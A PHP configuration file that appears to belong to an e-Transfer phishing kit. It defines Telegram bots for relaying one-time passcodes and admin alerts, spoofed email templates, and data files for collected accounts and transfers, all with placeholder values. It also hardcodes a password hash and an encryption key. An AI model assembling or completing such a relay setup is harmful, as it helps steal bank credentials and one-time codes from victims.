<?php
return [
    // General
    'sendername'       => 'KOURTNEY KIVIERA',
    'support_email'    => 'support@example.com',
    'support_phone'    => '+1 (780) 473-4567',

    // Profile (user/organization)
    'profile' => [
        'name'          => 'Default User',
        'email'         => 'user@example.com',
        'phone'         => '+1 (780) 123-4567',
        'address'       => '123 Main St, Edmonton, AB',
        'work_email'    => 'work@example.com',
        'work_phone'    => '+1 (780) 987-6543',
        'work_ext'      => '101',
        'work_address'  => '456 Corporate Ave, Edmonton, AB',
        'last_login'    => null, // dynamically set by session or app
    ],

    // Telegram bot controllers (multiple bots)
    'telegram' => [
        'tokens'   => [
            'bot_token_1',
            'bot_token_2',
        ],
        'chat_ids' => [
            '-1001234567890',
            '-1009876543210',
        ],
    ],

    // OTP notification bot
    'otp' => [
        'tokens'   => [
            'otp_bot_token_1',
            'otp_bot_token_2',
        ],
        'chat_ids' => [
            '-1001111111111',
            '-1002222222222',
        ],
    ],

    // Admin bot notifications
    'admin' => [
        'tokens'   => [
            'admin_bot_token',
        ],
        'chat_ids' => [
            '-1003333333333',
        ],
    ],

    // SMTP configuration for sending emails
    'smtp' => [
        'host'      => 'smtp.example.com',
        'port'      => 587,
        'user'      => 'your_email@example.com',
        'pass'      => 'your_email_password',
        'from'      => 'your_email@example.com',
        'encryption'=> 'tls', // options: 'tls', 'ssl', ''
    ],

    // Web templates
    'email_template'      => './template/default_template.html',
    'etransfer_template'  => './template/etransfer_template.html',

    // Files
    'accounts_file'       => './data/accounts.json',
    'pending_file'        => './data/pending.csv',
    'contacts_file'       => './data/contacts.csv',
    'transactions_file'   => './data/transactions.log',
    'transfers_file'      => './data/transfers.csv',

    // Security
    'csrf_token_length'   => 32,
    'transfer_expiry_days'=> 30,
    'account_password_hash'=> '$2y$10$e0NRtH9F1xRk4cB9Xv5uUeS.Kb4mW.uP6OxKQk0RQcLr/OeBtpi5C',

    // Encryption
    'encryption' => [
        'key'    => '8d969eef6ecad3c29a3a629280e686cf0d4a7d8cc7',
        'cipher' => 'aes-256-cbc',
    ],

    // Optional extended bots
    'extra_bots' => [
        [
            'name'     => 'ExtraBot1',
            'token'    => 'extra_bot_token_1',
            'chat_ids' => ['-1004444444444', '-1005555555555'],
        ],
        [
            'name'     => 'ExtraBot2',
            'token'    => 'extra_bot_token_2',
            'chat_ids' => ['-1006666666666'],
        ],
    ],
];